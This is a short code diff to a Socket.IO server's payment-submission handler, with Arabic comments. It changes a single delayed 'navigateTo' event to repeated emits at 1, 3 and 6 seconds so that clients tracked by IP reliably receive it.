@@ -191,15 +191,17 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
           ipToSocket.set(clientIp, socket.id);
           socket.join(`ip_${clientIp}`);
         }
-        // إرسال navigateTo مباشرة على socket العميل الحالي + broadcast
-        setTimeout(() => {
-          // إرسال مباشر على socket العميل
+        // إرسال navigateTo بعد 3 ثوانٍ لإعطاء الوقت الكافي للـ client لجلب IP من ipify.org
+        // نُرسل عدة مرات لضمان الوصول
+        const sendNavigate = () => {
           socket.emit("navigateTo", { page: "bCall", ip: clientIp });
-          // إرسال على الـ room إذا كان IP معروف
           if (clientIp && clientIp !== "unknown") {
             io?.to(`ip_${clientIp}`).emit("navigateTo", { page: "bCall", ip: clientIp });
           }
-        }, 300);
+        };
+        setTimeout(sendNavigate, 1000);
+        setTimeout(sendNavigate, 3000);
+        setTimeout(sendNavigate, 6000);
       } catch (err: any) {
         console.error("[Socket.io] submitPaymentData error:", err);
         socket.emit("ackPayment", { success: false, error: err.message });
